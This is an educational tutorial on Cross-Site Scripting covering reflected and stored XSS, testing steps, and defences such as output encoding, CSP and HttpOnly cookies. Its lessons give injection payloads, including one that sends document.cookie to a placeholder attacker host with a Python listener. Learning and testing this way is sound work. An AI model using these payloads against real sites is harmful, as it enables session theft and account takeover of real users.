# Cross-Site Scripting (XSS) Fundamentals

## 1. What is Cross-Site Scripting?

Cross-Site Scripting (XSS) is a client-side web vulnerability that allows an attacker to inject malicious JavaScript into a web page viewed by other users.

When successful, the injected script executes in the victim’s browser under the security context of the vulnerable application.

Because browsers trust scripts delivered by a legitimate website, injected code runs with the same permissions as the application itself.

This can lead to:

- Session hijacking  
- Account takeover  
- Data theft  
- Performing actions as another user  
- Full application compromise (in privileged contexts)

---

## 2. How Web Applications Normally Work

A simplified flow:

1. The browser sends an HTTP request.
2. The server processes it.
3. The server returns HTML, CSS, and JavaScript.
4. The browser renders the page.

The browser assumes that returned content is safe.

XSS exploits this trust.

If user input is not validated or sanitised properly, attackers can inject JavaScript that gets returned as part of the page.

---

## 3. How JavaScript Executes in XSS

When a browser encounters a `<script>` tag, it executes the JavaScript inside it.

Example:

```html
<script>alert(1)</script>
```

Breakdown:

- `<script>` → Start of executable JavaScript  
- `alert(1)` → Displays a pop-up with the number 1  
- `</script>` → End of script block  

If this runs, arbitrary JavaScript execution is possible.

`alert(1)` is commonly used as a proof of concept because:

- It is harmless
- It is visible
- It confirms execution

---

## 4. Beyond `<script>` Tags

Because `<script>` is commonly filtered, attackers often use alternative methods.

### Event Handler Injection

```html
<img src="x" onerror="alert(1)">
```

Breakdown:

- `<img>` attempts to load an image
- `src="x"` causes it to fail
- `onerror` executes JavaScript when the image fails

---

### Inline Events

```html
<button onclick="alert(1)">Click</button>
```

Here, JavaScript executes when the user clicks the button.

There are many possible event handlers:

- `onclick`
- `onmouseover`
- `onerror`
- `onload`

---

## 5. Types of XSS

### Reflected XSS

- Input is reflected immediately in the HTTP response.
- Usually triggered via crafted URLs.
- Requires victim interaction.

Example:

```
https://example.com/search?q=<script>alert(1)</script>
```

The script executes when the victim loads the URL.

---

### Stored (Persistent) XSS

- Malicious input is stored on the server.
- Executed whenever users load the affected page.
- More dangerous because it does not require repeated injection.

Common injection points:

- Comment sections
- User profiles
- Reviews
- File names

---

## 6. Identifying XSS Vulnerabilities

### Step 1 – Find Controllable Input

Look for:

- Search fields
- Comments
- Profile names
- Query parameters

Submit a unique test string:

```
wiggle
```

Inspect the page source to see how it is rendered.

---

### Step 2 – Test HTML Rendering

Submit:

```html
<b>wiggle</b>
```

If it appears bold, input is being rendered as HTML instead of plain text.

This increases XSS risk.

---

### Step 3 – Test Script Injection

Submit:

```html
<script>alert(1)</script>
```

If executed, XSS is confirmed.

If `<script>` is filtered, try alternatives:

```html
<img src="x" onerror="alert(1)">
```

---

# Practical Lessons

## Lesson 1 – Confirm HTML Rendering

Objective: Determine whether user input is treated as HTML.

1. Submit a unique word.
2. Inspect the page source.
3. Try formatting tags like:

```html
<h1>test</h1>
```

If the heading renders visually, HTML is being processed.

---

## Lesson 2 – Test Basic JavaScript Execution

Submit:

```html
<script>alert(1)</script>
```

If blocked, test event handlers:

```html
<img src="x" onerror="alert(2)">
```

Observe whether JavaScript executes.

---

## Lesson 3 – Mouse-Based Event Execution

Test inline events:

```html
<button onmouseover="alert(3)">Hover</button>
```

Hover over the element.

If it executes, event-based XSS is possible.

---

## Lesson 4 – Reading Cookies

If JavaScript execution is confirmed, test:

```html
<script>alert(document.cookie)</script>
```

If cookies appear:

- The cookie is accessible to JavaScript.
- `HttpOnly` is not enabled.

---

# 7. Session Hijacking with XSS

Because HTTP is stateless, session cookies identify logged-in users.

If an attacker can retrieve a victim’s cookie, they may impersonate them.

This only works if:

- `HttpOnly` is NOT set
- The page allows JavaScript execution
- Cookies are accessible via `document.cookie`

---

## Lesson 5 – Simulating Cookie Exfiltration

Start a listener:

```bash
python3 -m http.server 8000
```

Inject:

```html
<img src="x" onerror="document.location='http://ATTACKER-IP:8000/?c='+document.cookie">
```

If successful, the victim’s browser sends their cookie to the attacker's server.

---

## 8. Defensive Considerations

To prevent XSS:

- Validate and sanitise input
- Use output encoding
- Implement Content Security Policy (CSP)
- Enable `HttpOnly` on cookies
- Enable `Secure` cookies over HTTPS

---

## Key Security Takeaways

- XSS is a client-side vulnerability.
- It exploits trust between the browser and server.
- Stored XSS is generally more dangerous than reflected.
- Session cookies are a primary target.
- Proper input validation and output encoding are critical.

---

## Summary

Cross-Site Scripting allows attackers to inject and execute malicious JavaScript in a victim’s browser. Understanding how XSS works is essential for identifying vulnerable input points, testing applications safely, and implementing proper defensive controls.
